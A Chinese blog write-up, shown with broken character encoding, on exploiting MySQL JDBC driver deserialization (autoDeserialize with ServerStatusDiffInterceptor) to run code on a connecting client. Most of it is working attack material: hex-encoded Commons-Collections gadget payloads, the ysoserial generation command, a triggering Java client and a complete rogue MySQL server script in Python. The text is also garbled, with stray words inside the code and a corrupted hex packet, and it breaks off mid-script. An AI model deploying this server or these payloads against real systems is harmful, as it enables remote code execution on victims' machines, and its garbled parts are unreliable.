å½“jdbcå®¢æˆ·ç«¯è¿æ¥åˆ°è¿œç¨‹mysqlæœåŠ¡å™¨çš„æ—¶å€™ï¼ŒåŒæ–¹åœ¨è¿æ¥è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œä¸€äº›æ•°æ®äº¤æ¢å¹¶æ‰§è¡Œä¸€äº›æŸ¥è¯¢è¯­å¥ï¼Œæ¯”å¦‚SHOW SESSION STATUSï¼Œåœ¨ä½¿ç”¨ç‰¹å®šæ„é€ çš„jdbcé“¾æ¥å»è¿æ¥mysqlæœåŠ¡å™¨æ—¶ï¼ŒSHOW SESSION STATUSçš„è¿”å›æ•°æ®ä¼šåœ¨å®¢æˆ·ç«¯è¿›è¡Œååºåˆ—åŒ–è¿›è€Œè§¦å‘RCEä»£ç ã€‚\næ ¹æ® http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ ä¸­çš„æè¿°ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰‹åŠ¨è§¦å‘ååºåˆ—åŒ–ï¼Œæ³¨æ„è¿™ä¸æ˜¯åœ¨è§¦å‘jdbcååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯åœ¨åé¢åˆ©ç”¨çš„æ—¶å€™æœ‰ç”¨ã€‚\nCREATE DATABASE IF NOT EXISTS test; CREATE TABLE IF NOT EXISTS test.eviltable ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, evil blob, PRIMARY KEY (`id`) ); set @obj=0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278; INSERT INTO test.eviltable(`evil_2`) VALUES (@obj); è¯¥æ•°æ®æ˜¯ç”±æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆçš„\njava8 -jar ysoserial.jar CommonsCollections7 \u0026#34;touch /tmp/cc7\u0026#34; | xxd -ps -c 200 | tr -d \u0026#39;\\n\u0026#39; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; public class main { public static void main(String[] args) throws Exception{ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); String jdbc_url = \u0026#34;jdbc:mysql://192.168.31.119:3306/test?\u0026#34; + \u0026#34;autoDeserialize=true\u0026#34; + \u0026#34;\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;; Connection con = DriverManager.getConnection(jdbc_url,\u0026#34;xxxx\u0026#34;,\u0026#34;toor\u0026#34;); PreparedStatement ptmt = con.prepareStatement(\u0026#34;select evil from eviltable ;\u0026#34;); ResultSet rs = ptmt.executeQuery(); rs.next(); rs.getObject(1); } } å¯åŠ¨wiresharkè¿›è¡ŒæŠ“åŒ…ï¼Œè®¾ç½®è¿‡æ»¤è§„åˆ™mysql\nå›¾ä¸­é€‰ä¸­çš„æ•°æ®åŒ…å°±æ˜¯æ‰§è¡Œselect evil from eviltable ;åè¿”å›çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯åˆšæ‰ç”Ÿæˆçš„æ•°æ®ã€‚å°†å…¶å¤åˆ¶å‡ºæ¥ï¼Œå¹¶åˆ é™¤mysqlä¹‹å¤–çš„æ•°æ®ï¼Œå¾—åˆ°å¦‚ä¸‹æ•°æ®\n01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000 è¯¥æ•°æ®åœ¨jdbcç«¯è¢«ååºåˆ—åŒ–åè§¦å‘äº†æ¼æ´ã€‚\nè¿™åªæ˜¯æ™®é€šçš„ååºåˆ—åŒ–ï¼Œè¦åœ¨jdbcè¿æ¥çš„è¿‡ç¨‹ä¸­è§¦å‘ååºåˆ—åŒ–ï¼Œé¦–å…ˆæ¥çœ‹com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()\npublic class ServerStatusDiffInterceptor implements QueryInterceptor { ... public \u0026lt;T extends Resultset\u0026gt; T postProcess(Supplier\u0026lt;String\u0026gt; sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) { this.populateMapWithSessionStatusValues(this.postExecuteValues); this.log.logInfo(\u0026#34;Server status change for query:\\n\u0026#34; + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues)); return null; } private void populateMapWithSessionStatusValues(Map\u0026lt;String, String\u0026gt; toPopulate) { Statement stmt = null; ResultSet rs = null; try { try { toPopulate.clear(); stmt = this.connection.createStatement(); rs = stmt.executeQuery(\u0026#34;SHOW SESSION STATUS\u0026#34;); ResultSetUtil.resultSetToMap(toPopulate, rs); } finally { if (rs != null) { rs.close(); } if (stmt != null) { stmt.close(); } } } catch (SQLException var8) { throw ExceptionFactory.createException(var8.getMessage(), var8); } } ... } ServerStatusDiffInterceptoræ˜¯ä¸€ä¸ªå®ç°äº†QueryInterceptoræ¥å£çš„æ‹¦æˆªå™¨ï¼Œå½“queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptorçš„æ—¶å€™å°±ä¼šç»è¿‡è¿™ä¸ªæ‹¦æˆªå™¨ï¼Œå¹¶è°ƒç”¨è¿™ä¸ªæ‹¦æˆªå™¨çš„preProcessæ–¹æ³•å’Œ postProcessæ–¹æ³•ã€‚\nå¯ä»¥çœ‹åˆ°SHOW SESSION STATUSè¯­å¥è¯·æ±‚çš„ç»“æœè¿›å…¥äº† com.mysql.cj.jdbc.util.ResultSetUtil çš„ resultSetToMapæ–¹æ³•ä¸­ã€‚è·Ÿè¿›çœ‹çœ‹\npublic class ResultSetUtil { public ResultSetUtil() { } public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException { while(rs.next()) { mappedValues.put(rs.getObject(1), rs.getObject(2)); } } ... } è°ƒç”¨äº† com.mysql.cj.jdbc.result.ResultSetImplçš„getObjectæ–¹æ³•\npublic Object getObject(int columnIndex) throws SQLException { try { this.checkRowPos(); this.checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; if (this.thisRow.getNull(columnIndexMinusOne)) { return null; } else { Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch(field.getMysqlType()) { case BIT: if (!field.isBinary() \u0026amp;\u0026amp; !field.isBlob()) { return field.isSingleBit() ? this.getBoolean(columnIndex) : this.getBytes(columnIndex); } else { byte[] data = this.getBytes(columnIndex); if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(\u0026#34;autoDeserialize\u0026#34;).getValue()) { return data; } else { Object obj = data; if (data != null \u0026amp;\u0026amp; data.length \u0026gt;= 2) { if (data[0] != -84 || data[1] != -19) { return this.getString(columnIndex); } try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException var13) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + var13.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), this.getExceptionInterceptor()); } catch (IOException var14) { obj = data; } } return obj; } } ... } } } } è¿™é‡Œè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œåœ¨autoDeserialize=trueçš„æƒ…å†µä¸‹ä¼šå¯¹æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚\né‚£ä¹ˆé“¾æ¡å°±ä¼šæ¯”è¾ƒæ¸…æ™°äº†ï¼Œæ¥ä¸‹æ¥æ˜¯æ€ä¹ˆä¼ªé€ ä¸€ä¸ªmysqlæœåŠ¡ç«¯æ¥å’Œjdbcå®¢æˆ·ç«¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯å‘é€SHOW SESSION STATUSçš„æ—¶å€™å°†payloadå‘é€ç»™å®¢æˆ·ç«¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚è¿™é‡Œé€šè¿‡è§‚å¯Ÿwiresharkæ•°æ®åŒ…ç®€å•åˆ†æä¸€ä¸‹\né¦–å…ˆæ˜¯greetingï¼Œç„¶åjdbcå‘é€ç™»é™†è¯·æ±‚ï¼ŒæœåŠ¡ç«¯è¿”å›Response OKæ•°æ®ï¼Œè¿™ä¸ªResponse OKåœ¨åé¢çš„æ•°æ®äº¤äº’ä¸­å¤šæ¬¡ç”¨åˆ°ï¼Œéœ€è¦æˆ‘ä»¬ä¼ªé€ çš„mysqlæœåŠ¡ç«¯ç”¨æ¥è¿›è¡Œæ•°æ®è¿”å›ã€‚åœ¨ç»è¿‡ä¸€äº›æ•°æ®åå•†åï¼Œæ¥åˆ°SHOW SESSION STATUSéƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼ªé€ çš„mysqlæœåŠ¡ç«¯å°±å¯ä»¥å‘é€çœŸæ­£çš„payloadç»™jdbcå®¢æˆ·ç«¯æ¥è¿›è¡Œååºåˆ—åŒ–äº†ã€‚\næ¼æ´åˆ©ç”¨ è¿™é‡Œç›´æ¥æ‹¿åˆ«çš„å¸ˆå‚…çš„è„šæœ¬ï¼Œä»https://xz.aliyun.com/t/8159#toc-1 è¿™é‡Œæ‹¿çš„\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): # fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™ java -jar ysoserial [common7é‚£ä¸ª] \u0026#34;calc\u0026#34; \u0026gt; a file= r\u0026#39;a\u0026#39; if os.path.isfile(file): with open(file, \u0026#39;rb\u0026#39;) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=\u0026#39;utf-8\u0026#39;) print(\u0026#34;open successs\u0026#34;) else: print(\u0026#34;open false\u0026#34;) #calc payload_content=\u0026#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878\u0026#39; return payload_content # ä¸»è¦é€»è¾‘ def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡ send_data(conn,greeting_data) while True: # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ 1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok receive_data(conn) send_data(conn,response_ok_data) #å…¶ä»–è¿‡ç¨‹ data=receive_data(conn) #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å· if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c21çš„0009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000\u0026#39; send_data(conn,_payload) data=receive_data(conn) elif \u0026#34;show warnings\u0026#34; in data: _payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;set names\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;set character_set_results\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;show session status\u0026#34; in data: mysql_data = \u0026#39;0100000102\u0026#39; mysql_data += \u0026#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000\u0026#39; mysql_data += \u0026#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000\u0026#39; # ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ # è·å–payload payload_content=get_payload_content() # è®¡ç®—payloadé•¿åº¦ payload_length = str(hex(len(payload_content)//2)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # è®¡ç®—æ•°æ®åŒ…é•¿åº¦ data_len = str(hex(len(payload_content)//2 + 4)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + \u0026#39;04\u0026#39; + \u0026#39;fbfc\u0026#39;+ payload_length_hex mysql_data += str(payload_content) mysql_data += \u0026#39;07000005fe000022000100\u0026#39; send_data(conn, mysql_data) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535show session status441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() ç»è¿‡ä¹‹å‰çš„åˆ†æï¼Œè¿™ä¸ªè„šæœ¬æ˜¯ä¸éš¾çœ‹æ‡‚çš„ï¼Œä½†æ˜¯è¯¥å·¥å…·åœ¨æˆ‘è¿™é‡Œä½¿ç”¨çš„æ—¶å€™æ— æ³•å¤ç°ï¼ŒåŸå› åœ¨äºshow session statusä¹‹åå‘é€çš„payloadæœ‰è¯¯ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ¯•ç«Ÿè¦ä¿®æ”¹è¿™éƒ¨åˆ†ä»£ç æ˜¯éœ€è¦å¯¹mysqlå‘é€çš„æ•°æ®åŒ…æ ¼å¼è¿›è¡Œä¸€ä¸ªç³»ç»Ÿçš„äº†è§£å’Œè®¤è¯†çš„ï¼Œå…³äºæ•°æ®åŒ…æ ¼å¼ï¼Œåœ¨https://xz.aliyun.com/t/8159#toc-1 è¿™ç¯‡æ–‡ç« ä¸­æœ‰åˆ†æåˆ°ï¼Œä½†æˆ‘æ— æ„å¯¹æ•°æ®åŒ…æ ¼å¼ä½œæ·±ç©¶ï¼Œäºæ˜¯ç”¨äº†ä¸€ä¸ªæ¯”è¾ƒå·æ‡’çš„åŠæ³•ã€‚\nè¿˜è®°å¾—ä¹‹å‰ç”¨jdbcå°†payloadè¯·æ±‚å›æœ¬åœ°å¹¶è¿›è¡Œæ‰‹åŠ¨ååºåˆ—åŒ–æ—¶å€™çš„æ“ä½œå—ï¼Œæˆ‘ä»¬å¯ä»¥ä»wiresharkä¸­å°†é‚£ä¸ªæ•°æ®åŒ…ä¸­çš„æ•°æ®copyä¸‹æ¥ï¼Œåˆ é™¤mysqlæ•°æ®ä»¥å¤–çš„æ•°æ®ï¼Œç„¶ååŠ å…¥åˆ°è„šæœ¬ä¸­ï¼Œé‚£ä¹ˆè„šæœ¬è¿›è¿‡ä¿®æ”¹ä¹‹åå¦‚ä¸‹æ‰€ç¤ºã€‚\n# -*- coding:utf-8 -*- #@Time : 2020/7/27 2:10 #@Author: Tri0mphe7 #@File : server.py import socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data))æœ‹å‹ä»–å¥½å“¦ä½  # ä¸»è¦é€»è¾‘ def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡ send_data(conn,greeting_data) while True: # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ 1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok receive_data(conn) send_data(conn,response_ok_data) #å…¶ä»–è¿‡ç¨‹ data=receive_data(conn) #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å· if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000\u0026#39; send_data(conn,_payload) data=receive_data(conn) elif \u0026#34;show warnings\u0026#34; in data: _payload = 